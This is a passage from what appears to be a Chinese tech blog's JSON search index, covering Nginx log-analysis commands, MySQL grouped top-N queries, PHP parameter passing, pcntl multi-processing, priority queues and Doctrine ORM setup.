$7&#125;&#39;|sort -n|uniq -c|sort -nr|head -100 14.统计蜘蛛抓取次数 1grep &#39;Baiduspider&#39; access.log |wc -l 15.统计蜘蛛抓取404的次数 1grep &#39;Baiduspider&#39; access.log |grep &#39;404&#39; | wc -l 16.TCP连接统计,查看当前TCP连接数 1netstat -tan | grep &quot;ESTABLISHED&quot; | grep &quot;:80&quot; | wc -l 17.用tcpdump嗅探80端口的访问看看谁最高 1tcpdump -i eth0 -tnn dst port 80 -c 1000 | awk -F&quot;.&quot; &#39;&#123;print $1&quot;.&quot;$2&quot;.&quot;$3&quot;.&quot;$4&#125;&#39; | sort | uniq -c | sort -nr","categories":[{"name":"Linux","slug":"Linux","permalink":"https://wangbjun.github.io/categories/Linux/"}],"tags":[{"name":"Nginx","slug":"Nginx","permalink":"https://wangbjun.github.io/tags/Nginx/"}]},{"title":"解决MySQL分组排序求最值问题","slug":"mysql-group-orderby","date":"2018-01-05T11:00:03.000Z","updated":"2020-01-08T09:49:09.395Z","comments":true,"path":"2018/01/05/mysql-group-orderby/","link":"","permalink":"https://wangbjun.github.io/2018/01/05/mysql-group-orderby/","excerpt":"首先，先明确一下问题，所谓求分组的最值意思的就是在sql里面使用group by之后，每个分组有多条数据，我们要根据一定条件取其中最大的一条或者多条！ 先看一个数据表 blogs 结构，简单说一下，cat_id 就是分类ID，可以看到一个分类有多条记录： 举个非常典型的问题: 1.求某个分类ID下，查看次数最多的3条数据？这个问题很简单，基本上大家都能写出来这样的sql:","text":"首先，先明确一下问题，所谓求分组的最值意思的就是在sql里面使用group by之后，每个分组有多条数据，我们要根据一定条件取其中最大的一条或者多条！ 先看一个数据表 blogs 结构，简单说一下，cat_id 就是分类ID，可以看到一个分类有多条记录： 举个非常典型的问题: 1.求某个分类ID下，查看次数最多的3条数据？这个问题很简单，基本上大家都能写出来这样的sql: 1select * from blogs where cat_id = $cat_id order by view_num desc limit 3; 2.求多个分类ID下，查看次数最多的3条数据呢？这个问题就在于求多个，也就是我要批量查询，不能一个个查，有很多人图省事就直接for循环一个个查了,如果说只有几个ID这样做还可以，如果有几十个这样的数据就意味着几十次的查库操作，对性能影响还是挺大的，所以必须想办法！ sql如下： 1select SUBSTRING_INDEX(GROUP_CONCAT(cat_id,'-',id ORDER BY view_num),',',3) from blogs where cat_id in(1,2,3,4) GROUP BY cat_id 这条语句看上去比较复杂，不要慌，SUBSTRING_INDEX 是内置函数，功能类似于PHP里面的 substr，在这意思是取前3个数据，重点是 group_concat, 这个函数很多人都用过，但是我估计很多人都不知道后面还可以写 order by，所以这条sql的意思就是在每个分组里面排序取前3个。 但是取出来的数组格式并不好看，是以 cat_id-id 这种形式取出来的，可以看到有多个： 后面的操作只能拿到代码里面处理了，可能需要循环取出所有id，然后批量获取数据，最后再拼接出来想要的数据！虽然比较麻烦，在代码里面需要多出很多次for循环操作，但是相比于多查几十次库，这点代码运行开销还是很小的！","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://wangbjun.github.io/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"https://wangbjun.github.io/tags/MySQL/"},{"name":"数据库","slug":"数据库","permalink":"https://wangbjun.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]},{"title":"浅谈PHP前后端传参常见的几种方式","slug":"php-form-pass-method","date":"2017-09-05T07:00:00.000Z","updated":"2020-01-09T08:08:00.293Z","comments":true,"path":"2017/09/05/php-form-pass-method/","link":"","permalink":"https://wangbjun.github.io/2017/09/05/php-form-pass-method/","excerpt":"在Web开发里面，有前后端之分，它们之间的交互主要通过传参的方式，但是这个传参也分几种形式，比如说Form表单提交、Ajax提交…今天我就在这里总结一下开发中常见的几种形式： 1.这种方式是最原始最常见的方式，提交的时候也有可能是通过js触发，其请求头Content-Type为: application/x-www-form-urlencoded，示例如下： 前端代码123456789&lt;body&gt; &lt;form action&#x3D;&quot;backend.php&quot; method&#x3D;&quot;post&quot;&gt; &lt;label for&#x3D;&quot;name&quot;&gt;姓名:&lt;&#x2F;label&gt; &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;name&quot; name&#x3D;&quot;name&quot;&gt; &lt;label for&#x3D;&quot;name&quot;&gt;年龄:&lt;&#x2F;label&gt; &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;age&quot; name&#x3D;&quot;age&quot;&gt; &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt; &lt;&#x2F;form&gt;&lt;&#x2F;body&gt;","text":"在Web开发里面，有前后端之分，它们之间的交互主要通过传参的方式，但是这个传参也分几种形式，比如说Form表单提交、Ajax提交…今天我就在这里总结一下开发中常见的几种形式： 1.这种方式是最原始最常见的方式，提交的时候也有可能是通过js触发，其请求头Content-Type为: application/x-www-form-urlencoded，示例如下： 前端代码123456789&lt;body&gt; &lt;form action&#x3D;&quot;backend.php&quot; method&#x3D;&quot;post&quot;&gt; &lt;label for&#x3D;&quot;name&quot;&gt;姓名:&lt;&#x2F;label&gt; &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;name&quot; name&#x3D;&quot;name&quot;&gt; &lt;label for&#x3D;&quot;name&quot;&gt;年龄:&lt;&#x2F;label&gt; &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;age&quot; name&#x3D;&quot;age&quot;&gt; &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt; &lt;&#x2F;form&gt;&lt;&#x2F;body&gt; 后端接收1234&lt;?phpvar_dump($_POST[&#39;name&#39;]);var_dump($_GET[&#39;age&#39;]);var_dump($_REQUEST[&#39;age]); 请求头 这种提交方式也是ajax默认的提交方式,请求参数是以key-value键值对的形式传递到后端,在PHP里面通$_POST等超全局变量就可以获取到,简单实用。其未经解析的原始的数据其实是：name=PHP&amp;age=25 2. JSON形式提交这种形式，需要设置一下请求头Content-Type为application/json，实例如下： 前端代码12345678910111213$.ajax(&#123; type: &#39;POST&#39;, url: &quot;backend.php&quot;, data: &#123; &#39;name&#39;: &#39;hello&#39;, &#39;age&#39;: 15, &#125;, contentType: &#39;application&#x2F;json&#39;, dataType: &quot;json&quot;, success: function (data) &#123; console.log(data); &#125; &#125;); 请求头 从上面的截图可以看到，请求参数那里变成Request Payload，虽然格式上看上去和之前form提交差不多，但是这时候如果后台用$_POST这类方法是无法获取的，需要换一种方式： 1$input &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;); 上面这种方式获取到的内容是字符串: name=Jun&amp;age=15，在这个例子里面反而不容易处理了，实际上采用json这种方式提交的参数的话，一般都是把需要的数据封装成json格式提交，在js里面就是把数据放到对象里面，然后序列化： 1234567891011121314var data &#x3D; &#123; &#39;name&#39;: &#39;Jun&#39;, &#39;age&#39;: 15,&#125;;$.ajax(&#123; type: &#39;POST&#39;, url: &quot;backend.php&quot;, data: JSON.stringify(data), contentType: &#39;application&#x2F;json&#39;, dataType: &quot;json&quot;, success: function (data) &#123; console.log(data); &#125;&#125;); 这是再查看请求头： 可以看到参数变成json格式，这时候PHP后端就可以采用json_decode函数去获取参数： 1$input &#x3D; json_decode(file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;), true); 3.文件上传 一般上传图片等各种文件的时候用的到，Content-Type是 multipart/form-data 请求头类似如下： 123456789101112131415------WebKitFormBoundary63FiWN3UoYxd8OT6Content-Disposition: form-data; name&#x3D;&quot;UploadFile&quot;; filename&#x3D;&quot;QQ截图20170925101502.png&quot;Content-Type: image&#x2F;png------WebKitFormBoundary63FiWN3UoYxd8OT6Content-Disposition: form-data; name&#x3D;&quot;sid&quot;sid------WebKitFormBoundary63FiWN3UoYxd8OT6Content-Disposition: form-data; name&#x3D;&quot;fun&quot;add------WebKitFormBoundary63FiWN3UoYxd8OT6Content-Disposition: form-data; name&#x3D;&quot;mode&quot; 4. 总结这几种方式功能上说没什么区别，都能实现数据的提交，大家选择自己喜欢的方式就行，最重要的是前后端协调好, 虽然这里后端是以PHP为例，但是其他语言也是大同小异。最后，再说一下数组提交，这个倒不是新的提交方式，我这里是指遇到那种一个字段提交多个数据的情况，比如说删除多个文章，一般前端需要传多个id，举例子字段名字叫ids，一般有这2种方案： 1. 逗号相隔 这样传参，后端获取到之后是一个字符串，在PHP里面可以用explode这样的函数去把字符串拆分成数组，非常方便，当然你也可以选择其他分隔符，比如说“-”，“+”等字符。 2. JSON形式这就是文中说的第二种方式，把id放在数组里面以json方式传到后台，这样后台可以直接获取到一个数组.","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://wangbjun.github.io/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://wangbjun.github.io/tags/PHP/"}]},{"title":"PHP多进程编程应用","slug":"php-multi-process","date":"2017-06-09T07:10:03.000Z","updated":"2020-01-08T09:43:32.249Z","comments":true,"path":"2017/06/09/php-multi-process/","link":"","permalink":"https://wangbjun.github.io/2017/06/09/php-multi-process/","excerpt":"在日常开发中，我们经常会遇到需要使用脚本处理一些数据，在数据量比较大的情况下，我们可以采用并行的方式处理，比如说： 1.启动多个实例这种方式简单实用，推荐，比如说使用下面的shell脚本我们就可以轻松的启动多个进程去处理 12345678#!&#x2F;bin&#x2F;bash for((i&#x3D;1;i&lt;&#x3D;8;i++))do &#x2F;usr&#x2F;bin&#x2F;php multiprocessTest.php &amp;done wait 但是这种方式依赖外部工具，不够灵活！其实我们也可以采用多进程|多线程的方式","text":"在日常开发中，我们经常会遇到需要使用脚本处理一些数据，在数据量比较大的情况下，我们可以采用并行的方式处理，比如说： 1.启动多个实例这种方式简单实用，推荐，比如说使用下面的shell脚本我们就可以轻松的启动多个进程去处理 12345678#!&#x2F;bin&#x2F;bash for((i&#x3D;1;i&lt;&#x3D;8;i++))do &#x2F;usr&#x2F;bin&#x2F;php multiprocessTest.php &amp;done wait 但是这种方式依赖外部工具，不够灵活！其实我们也可以采用多进程|多线程的方式 PHP提供了大量关于进程相关的扩展，大部分都是和linux系统编程相关，我觉得应该就是对C库api的调用，文档也基本上没写，如果想用好估计得对linux系统下C编程非常熟悉！ 其中pthreads是多线程需要用到的，多进程会用到pcntl和posix扩展，这篇文章就是简单介绍一下这两个扩展的应用。 2.启用多进程php多进程需要pcntl和posix扩展支持，可以通过 php -m 查看是否安装，需要注意的是目前多进程实现只能在cli模式下使用，虽然是个残废，不妨也了解一下，具体的API可以查看官方文档，这里先举个简单的例子： 12345678910111213141516&lt;?phpforeach (range(1, 5) as $index) &#123; $pid &#x3D; pcntl_fork(); if ($pid &#x3D;&#x3D;&#x3D; -1) &#123; echo &quot;failed to fork!\\n&quot;; exit; &#125; elseif ($pid) &#123; $pid &#x3D; posix_getpid(); pcntl_wait($status); &#x2F;&#x2F;父进程必须等待一个子进程退出后，再创建下一个子进程。 echo &quot;I am the parent, pid: $pid\\n&quot;; &#125; else &#123; $cid &#x3D; posix_getpid(); echo &quot;fork the &#123;$index&#125;th child, pid: $cid\\n&quot;; exit; &#x2F;&#x2F;必须 &#125;&#125; 这个例子很简单，循环了5次，在每次循环的时候创建一个进程，然后打印一句话 主要使用的方法就是函数 pcntl_fork()，一次调用两次返回，在父进程中返回子进程pid，在子进程中返回0，出错返回-1 posix_getpid()函数是返回当前进程 id，pcntl_wait()是等待或返回fork的子进程状态，pcntl_wait()将会存储状态信息到status 参数上，这个通过status参数返回的状态信息可以通过其它函数获得。 其中执行结果如下，在不同的机器是pid不一样： 12345678910I am the parent, pid: 11183fork the 1th child, pid: 11184I am the parent, pid: 11183fork the 2th child, pid: 11185I am the parent, pid: 11183I am the parent, pid: 11183I am the parent, pid: 11183fork the 3th child, pid: 11186fork the 5th child, pid: 11188fork the 4th child, pid: 11187 第一个注意点: 如果是在循环中创建子进程,那么子进程中最后要exit,防止子进程进入循环! 第二个注意点: 这个和go的协程有点类型，主进程必须等待子进程执行完任务, 如果你不等待，你会发现一个是执行的顺序不固定，第二个打印的记录会少于10条，原因很简单，子进程还没来得及打印就结束了。 有一个简单方法是使用 pcntl_wait()，但是你会发现上面这个例子完全变成并行了…上面的结果就是，无论你运行多少次，每次都是按照1到5的顺序打印，这和我们多进程的所要实现的效果有点差异，我们需要的应该是1和5并行！ 下面这种写法就可以实现这种效果： 12345678910111213141516171819202122232425262728293031323334353637&lt;?php $ids &#x3D; []; foreach (range(1, 5) as $index) &#123; $ids[] &#x3D; $pid &#x3D; pcntl_fork(); if ($pid &#x3D;&#x3D;&#x3D; -1) &#123; echo &quot;failed to fork!\\n&quot;; exit; &#125; elseif ($pid) &#123; $pid &#x3D; posix_getpid(); echo &quot;I am the parent, pid: $pid\\n&quot;; &#125; else &#123; $cid &#x3D; posix_getpid(); echo &quot;fork the &#123;$index&#125;th child, pid: $cid\\n&quot;; exit; &#125;&#125; foreach ($ids as $i &#x3D;&gt; $pid) &#123; if ($pid) &#123; pcntl_waitpid($pid, $status); &#125;&#125; 结果如下：fork the 1th child, pid: 8392I am the parent, pid: 8390I am the parent, pid: 8390fork the 2th child, pid: 8393I am the parent, pid: 8390I am the parent, pid: 8390I am the parent, pid: 8390fork the 3th child, pid: 8394fork the 4th child, pid: 8395fork the 5th child, pid: 8396 多次运行你会发现，每次的打印顺序都不一样，这就说明了1到5是并行执行的，也就是实现了多进程的效果！ 其中pcntl_waitpid() 作用是等待或返回fork的子进程状态，挂起当前进程的执行直到参数pid指定的进程号的进程退出， 或接收到一个信号要求中断当前进程或调用一个信号处理函数 在这段代码里面，我们提前准备了一个数组存放这些子进程的pid，然后使用一个循环不停的查询其状态等待其结束！倘若你在上面的代码里面在子进程里面加一个随机的sleep，如下： 1234567891011121314151617$cid &#x3D; posix_getpid();$t &#x3D; random_int(1,20);sleep($t);echo &quot;fork the &#123;$index&#125;th child, pid: $cid, wait: $t\\n&quot;;exit;然后运行结果如下：I am the parent, pid: 8772I am the parent, pid: 8772I am the parent, pid: 8772I am the parent, pid: 8772I am the parent, pid: 8772fork the 1th child, pid: 8773, wait: 1fork the 4th child, pid: 8776, wait: 5fork the 3th child, pid: 8775, wait: 14fork the 2th child, pid: 8774, wait: 16fork the 5th child, pid: 8777, wait: 18 3.父进程和子进程之间关系？子进程是复制了父进程的代码和内存空间，这意味着如果你在父进程里面定义了一些变量，在子进程里面也是可以操作访问的，这同时也意味着如果多个子进程操作同一个变量必然会出现覆盖和争用问题 比如说同时修改一个变量、同时往一个文件写入内容，需要通过锁机制保证同一时刻只能有一个进程操作。 还有一些坑，假如你在父进程去实例化一个mysql连接，在多个子进程里面同时使用，也会出现争用问题，所以涉及到这类资源类的变量，务必在各个子进程内部单独创建！ 4.进程信号进程信号也是linux操作系统的一些概念，这里就说说在PHP里面关于信号的一个应用 有些项目里面有时候会用到一些脚本，比如处理redis队列的脚本，通常的做法是写一个while循环从队列里面不停的取出数据处理，为了防止内存泄露或者进程假死，一般都会定时的重启脚本，通过做法就是先终止脚本再启动脚本，但是做的不好可能会导致数据丢失 举个例子，假如你这个脚本刚好从redis取出一条数据，然后正在处理中，操作还未完成，你突然终止脚本，那这个数据就丢失了。 使用信号注册我们可以更加优雅的重启或者终止脚本，你可以称之为平滑重启！看一下下面的代码: 123456789101112131415161718&lt;?php &#x2F;&#x2F;ctrl+cpcntl_signal(SIGINT, function () &#123; fwrite(STDOUT, &quot;receive signal: &quot; . SIGINT . &quot; do nothing ...\\n&quot;);&#125;); &#x2F;&#x2F;killpcntl_signal(SIGTERM, function () &#123; fwrite(STDOUT, &quot;receive signal: &quot; . SIGTERM . &quot; I will exit!\\n&quot;); exit;&#125;); while (true) &#123; pcntl_signal_dispatch(); echo &quot;do something。。。\\n&quot;; sleep(5);&#125; Linux进程信号分为很多种，PHP里面定义了43种，咱就说说常用的几种： SIGINT 2 这个其实相对于 ctrl+c SIGTERM 15 就是 kill 默认的参数，表示终止进程 SIGKILL 9 就是 kill -9, 表示立马终止，这个信号在PHP里面是无法注册的 所谓注册信号就是接管系统对这个信号的处理方式，如果你不注册这个信号，进程就会按照默认方式去处理这个信号，如果你在代码里面注册这个信号，你就可以自定义处理方式，比如说在脚本里面先处理完当前数据，然后再退出！ 看明白了这个就可以读懂上面的例子了，其中 pcntl_signal 是注册信号处理handler，第一个参数是你需要注册的信号，第二个是处理操作，可以是匿名函数或者一个函数名，可以注册多个信号 pcntl_signal_dispatch 调用每个等待信号通过pcntl_signal() 安装的处理器。早期PHP还有一种写法是使用 ticks，性能非常差，php5.3之后建议都使用 pcntl_signal_dispatch。 说明一下：pcntl_signal()函数仅仅是注册信号和它的处理方法，真正接收到信号并调用其处理方法的是pcntl_signal_dispatch()函数必须在循环里调用，为了检测是否有新的信号等待dispatching。 5.应用场景由于进程的系统开销还是比较大，一般不太适合拿来做大规模并发程序，使用线程或者协程可能更好，拿来写个3-5个进程的后台脚本倒是有点用！比如说写个爬虫同时爬取多个网站的数据！举个例子： &lt;?php $urls = [ &apos;https://www.baidu.com&apos;, &quot;https://www.mi.com&quot;, &quot;https://www.qingyidai.com&quot; ]; $ids = []; foreach ($urls as $url) { $ids[] = $pid = pcntl_fork(); if ($pid === -1) { echo &quot;failed to fork!\\n&quot;; exit; } elseif ($pid) { } else { echo &quot;start get url: &quot;.$url.&quot;\\n&quot;; crawler($url); exit; } } //爬取网页，取出网页标题 function crawler($url) { $content = file_get_contents($url); preg_match(&quot;/&lt;title&gt;(.*)&lt;\\/title&gt;/&quot;, $content, $matches); echo $matches[1].&quot;\\n&quot;; } foreach ($ids as $i =&gt; $pid) { if ($pid) { pcntl_waitpid($pid, $status); } } 运行结果如下： start get url: https://www.baidu.com start get url: https://www.mi.com start get url: https://www.qingyidai.com 轻易贷 - 开元金融旗下品牌_网络借贷信息中介服务平台 百度一下，你就知道 小米商城 - 小米9、小米MIX 3、红米Note 7，小米电视官方网站当你执行这个脚本的时候，假如你在爬取的方法里面加一个sleep，这时候你在终端里面使用ps，你会看到4个进程，其中一个是父进程，其它3个是启动的子进程 感兴趣的可以再看看PHP的官方文档，上面提供了非常丰富的函数！https://www.php.net/manual/zh/book.pcntl.php 和 https://www.php.net/manual/zh/book.posix.php","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://wangbjun.github.io/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://wangbjun.github.io/tags/PHP/"}]},{"title":"PHP优先队列","slug":"php-priority-queue","date":"2017-06-05T07:00:00.000Z","updated":"2020-01-09T08:06:27.350Z","comments":true,"path":"2017/06/05/php-priority-queue/","link":"","permalink":"https://wangbjun.github.io/2017/06/05/php-priority-queue/","excerpt":"1.什么是优先队列？队列大家应该都很熟悉，专业的说队列是一种特殊的线性表，简单的说就是先进先出（FIFO），与队列相反的还有一种数据结构叫作栈，先进后出（FILO），这里的栈和内存里面的栈没啥关系，不要理解错了！ 队列在开发的应用挺多的，最广泛的就是消息队列，用来处理一些任务比如下单，抢购，需要按请求的时间排序，先来的先处理，关键是保持一种顺序结构。实际开发中，我们一般很少自己去实现队列，通常都是使用一些现成的服务，比如redis queue，rabbitmq。 优先队列（Priprity Queue），顾名思义，就是带有优先级的队列，也就是说不是按请求的顺序排序，而且根据某一些规则属性。举个例子：有一些12306的刷票软件，花钱买了加速包抢到票的几率更高。这里所谓几率更高换个说法就是优先级更高，如果只有10张票，肯定是先让那些花了钱的先抢到票，没花钱的话排后面。","text":"1.什么是优先队列？队列大家应该都很熟悉，专业的说队列是一种特殊的线性表，简单的说就是先进先出（FIFO），与队列相反的还有一种数据结构叫作栈，先进后出（FILO），这里的栈和内存里面的栈没啥关系，不要理解错了！ 队列在开发的应用挺多的，最广泛的就是消息队列，用来处理一些任务比如下单，抢购，需要按请求的时间排序，先来的先处理，关键是保持一种顺序结构。实际开发中，我们一般很少自己去实现队列，通常都是使用一些现成的服务，比如redis queue，rabbitmq。 优先队列（Priprity Queue），顾名思义，就是带有优先级的队列，也就是说不是按请求的顺序排序，而且根据某一些规则属性。举个例子：有一些12306的刷票软件，花钱买了加速包抢到票的几率更高。这里所谓几率更高换个说法就是优先级更高，如果只有10张票，肯定是先让那些花了钱的先抢到票，没花钱的话排后面。 2.为什么需要优先队列？假设现在有10000个人抢票，其中有50个人交了数目不一的钱，当系统抢到一张票后需要按照这些用户交钱的数目从大到小排序依次分配。如果让你去实现上面所说的抢票优先级，你会怎么设计呢？ 做法一：如果这些用户信息是存储到数据库里面，当每次抢到一张票的时候，使用sql语句排序取出符合条件的用户里面交钱最多的那位就行了。如果不是存储到数据库里面的，可能就需要在内存里面排序了，1万个用户信息虽然不多，但是你每次都需要重新排序。 做法二：使用redis sorted set 实现，Redis 有序集合和集合一样也是string类型元素的集合,且不允许重复的成员。不同的是每个元素都会关联一个double类型的分数，redis正是通过分数来为集合中的成员进行从小到大的排序，有序集合的成员是唯一的,但分数(score)却可以重复。 12345678sorted set 操作ZADD：向 sorted set 中添加元素ZCOUNT： sorted set 中 score 等于指定值的元素有多少个ZSCORE：sorted set 中指定元素的 score 是多少ZCARD： sorted set 中总共有多少个元素ZREM：删除 sorted set 中的指定元素ZREVRANGE：按照从大到小的顺序返回指定索引区间内的元素ZRANGE: 按照从小到大的顺序返回指定索引区间内的元素 值得一说的是，这个并不是并发安全的，因为取优先级最高的元素以及删除这个元素是两次操作，不是原子性的，不过可以使用lua脚本解决这个问题。 做法三：使用优先队列，大部分编程语言的标准库里面都自带优先队列实现，并不需要自己去实现，不过像PHP这样的Web程序每次请求结束后内存数据都会被销毁，使用自己构建的优先队列还不如第二种做法好使，或者实现一个常驻进程的服务供Web调用。 3.原理和使用优先队列是基于二叉堆的，构建一个优先队列实际上就是在构建一个二叉堆，二叉堆是一种特殊的堆，二叉堆是完全二元树（二叉树）或者是近似完全二元树（二叉树）。 二叉堆有两种：最大堆和最小堆。最大堆：父结点的键值总是大于或等于任何一个子节点的键值；最小堆：父结点的键值总是小于或等于任何一个子节点的键值。 二叉树是每个结点最多有两个子树的树结构。 树是一种非线性的数据结构，是由n（n &gt;=0）个结点组成的有限集合。 以上内容仅供参考，关于这些数据结构的实现和算法细节这里不说了，毕竟不简单，感兴趣的话可以详细了解一下。 这些算法虽然不简单，但是毕竟我们都是站在巨人的肩膀上，下面看一下在PHP SPL里面提供的优先队列实现。PHP的标准库里面提供了常用的数据结构，比如链表，堆，栈，最大堆，最小堆，固定大小数组，其中就有优先队列，其类摘要如下： 12345678910111213141516171819SplPriorityQueue implements Iterator , Countable &#123; /* 方法 */ public __construct ( void ) public int compare ( mixed $priority1 , mixed $priority2 ) public int count ( void ) public mixed current ( void ) public mixed extract ( void ) public int getExtractFlags ( void ) public void insert ( mixed $value , mixed $priority ) public bool isCorrupted ( void ) public bool isEmpty ( void ) public mixed key ( void ) public void next ( void ) public void recoverFromCorruption ( void ) public void rewind ( void ) public void setExtractFlags ( int $flags ) public mixed top ( void ) public bool valid ( void )&#125; 其中常用的是compare，count，current，insert，next，rewind，valid等方法，用法也相对简单，下面看一个完整的例子： 1234567891011121314151617&lt;?php$queue = new SplPriorityQueue();$queue-&gt;insert(\"A\", 2);$queue-&gt;insert(\"B\", 17);$queue-&gt;insert(\"C\", 4);$queue-&gt;insert(\"D\", 10);$queue-&gt;insert(\"E\", 1);//获取优先级最高的元素echo $queue-&gt;top().\"\\n\";//按照优先级从大到小遍历所有元素while ($queue-&gt;valid()) &#123; echo $queue-&gt;current().\"\\n\"; $queue-&gt;next();&#125; 默认情况下，这个是按照数值大小排序的，但是如果排序比较的属性的并不是一个数值怎么办呢？比如说是对象，这时候可以采用下面的写法，我们可以新建一个类继承标准库的类，然后根据自己的规则重写compare的方法： 12345678910111213141516171819202122232425262728293031323334353637&lt;?phpclass MyQueue extends SplPriorityQueue&#123; public function compare($priority1, $priority2) &#123; if ($priority1-&gt;age === $priority2-&gt;age) &#123; return 0; &#125; return $priority1-&gt;age &lt; $priority2-&gt;age ? -1 : 1; &#125;&#125;class Person&#123; public $age; public function __construct($age) &#123; $this-&gt;age = $age; &#125;&#125;$queue = new MyQueue();$queue-&gt;insert(\"A\", new Person(2));$queue-&gt;insert(\"B\", new Person(17));$queue-&gt;insert(\"C\", new Person(4));$queue-&gt;insert(\"D\", new Person(10));$queue-&gt;insert(\"E\", new Person(1));//获取优先级最高的元素echo $queue-&gt;top() . \"\\n\";//按照优先级从大到小遍历所有元素while ($queue-&gt;valid()) &#123; echo $queue-&gt;current() . \"\\n\"; $queue-&gt;next();&#125; 大家看懂了吗？如果错误欢迎指正！","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://wangbjun.github.io/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://wangbjun.github.io/tags/PHP/"},{"name":"Queue","slug":"Queue","permalink":"https://wangbjun.github.io/tags/Queue/"}]},{"title":"PHP开发中ORM的应用","slug":"php-orm","date":"2017-05-06T11:10:03.000Z","updated":"2020-01-09T08:06:05.342Z","comments":true,"path":"2017/05/06/php-orm/","link":"","permalink":"https://wangbjun.github.io/2017/05/06/php-orm/","excerpt":"1.什么是ORM？ 对象关系映射（Object Relational Mapping，简称ORM）模式是一种为了解决面向对象与关系数据库存在的互不匹配的现象的技术。简单的说，ORM是通过使用描述对象和数据库之间映射的元数据，将程序中的对象自动持久化到关系数据库中。 ORM并不是PHP独有的东西，只要和数据库打交道的语言都可以使用ORM，比如Java Web三大框架里面Hibernate，还有Doctrine(PHP重量级的ORM) ，Eloquent（laravel框架默认ORM，也可以单独使用）。","text":"1.什么是ORM？ 对象关系映射（Object Relational Mapping，简称ORM）模式是一种为了解决面向对象与关系数据库存在的互不匹配的现象的技术。简单的说，ORM是通过使用描述对象和数据库之间映射的元数据，将程序中的对象自动持久化到关系数据库中。 ORM并不是PHP独有的东西，只要和数据库打交道的语言都可以使用ORM，比如Java Web三大框架里面Hibernate，还有Doctrine(PHP重量级的ORM) ，Eloquent（laravel框架默认ORM，也可以单独使用）。 ORM是完全采用面向对象的方式去操作数据库，不用去拼SQL，对于复杂的SQL，ORM也支持直接运行原生SQL，咱先回顾一下平时咱们都是怎么操作数据库？举个例子，现在有一个库blog，一张表article，大部分的时候都是这是方式：新建MySQL连接，然后执行数据库操作，需要手写SQL： 12345678910111213&lt;?php$connect = mysqli_connect(\"localhost\", \"root\", \"123456\", \"blog\", \"3306\") or die(\"数据库连接失败！\");$connect-&gt;set_charset(\"utf8\");$id = 1;$sql = \"SELECT * FROM article WHERE id = $id\";$query = mysqli_query($connect, $sql);if (!$query) &#123; die(\"数据库查询失败!\");&#125;$assoc = $query-&gt;fetch_assoc();var_dump($assoc); 上面的写法有一些缺点，有一种更好的方式是使用PDO，扩展性更强，而且可以使用预处理防止SQL注入: 1234567891011121314&lt;?phptry &#123; $pdo = new PDO(\"mysql:host=localhost;dbname=blog\", \"root\", \"123456\");&#125; catch (PDOException $exception) &#123; echo \"Connect Failed\" . $exception-&gt;getMessage();&#125;$pdo-&gt;exec(\"set names utf8\");$id = 1;$prepare = $pdo-&gt;prepare(\"SELECT * FROM article WHERE id = ?\");$prepare-&gt;execute(array($id));while ($row = $prepare-&gt;fetch()) &#123; var_dump($row);&#125; 不过实际开发中，大家都是使用一些封装好的类和方法，比如laravel框架里面称之为查询构造器，我们可以使用这样方法去查询数据库： 12345678910111213141516&lt;?php$users = DB::table('users')-&gt;get();$price = DB::table('orders')-&gt;where('finalized', 1)-&gt;avg('price');$users = DB::table('users') -&gt;join('contacts', 'users.id', '=', 'contacts.user_id') -&gt;join('orders', 'users.id', '=', 'orders.user_id') -&gt;select('users.*', 'contacts.phone', 'orders.price') -&gt;get();$orders = DB::table('orders') -&gt;select('department', DB::raw('SUM(price) as total_sales')) -&gt;groupBy('department') -&gt;havingRaw('SUM(price) &gt; 2500') -&gt;get(); 还有比如说TP框架里面M方法，这些类和方法大大简化了查询操作，但本质上还是拼SQL，只不过调用的时候看起来更像面向对象，方便很多。 但是这些并不是真正意义上的ORM，最多只算得上是O(object)，它只是把数据库查询操作对象化了，但是没有解决对象之间的关系问题！ 2.Doctrinedoctrine是symfony框架默认ORM，下面我就简单介绍一下，官网连接: https://www.doctrine-project.org/ 一.安装按照官方的教程，最好的方式是使用composer: 123456&#123; \"require\": &#123; \"doctrine/orm\": \"^2.6.2\", \"symfony/yaml\": \"2.*\" &#125;&#125; 二.在项目根目录创建一个bootstrap.php文件：12345678910111213141516171819202122232425&lt;?php// bootstrap.phpuse Doctrine\\ORM\\Tools\\Setup;use Doctrine\\ORM\\EntityManager;require_once \"vendor/autoload.php\";// Create a simple \"default\" Doctrine ORM configuration for Annotations$isDevMode = true;$config = Setup::createAnnotationMetadataConfiguration(array(__DIR__.\"/src\"), $isDevMode);// or if you prefer yaml or XML//$config = Setup::createXMLMetadataConfiguration(array(__DIR__.\"/config/xml\"), $isDevMode);//$config = Setup::createYAMLMetadataConfiguration(array(__DIR__.\"/config/yaml\"), $isDevMode);// database configuration parameters$conn = array( 'dbname' =&gt; 'blog', 'user' =&gt; 'root', 'password' =&gt; '123456', 'host' =&gt; 'localhost', 'driver' =&gt; 'pdo_mysql', 'charset' =&gt; 'utf8',);// obtaining the entity manager$entityManager = EntityManager::create($conn, $config); 这里面有一些需要注意的地方，$idDevMode是配置是否开发模式. $config按照官方说法现在推荐使用 Annotation 也就说注解的方式配置，还支持xml和yaml，但是yaml这种方式已经被deprecated了，还有需要把src替换成你自己项目的目录，在本例中，是app。 下面还有数据库连接配置，官方给的案例是使用了sqlite，这里我改成了MySQL。 三.配置命令行工具同样在项目根目录新建一个 cli-config.php 文件： 12345&lt;?php// cli-config.phprequire_once 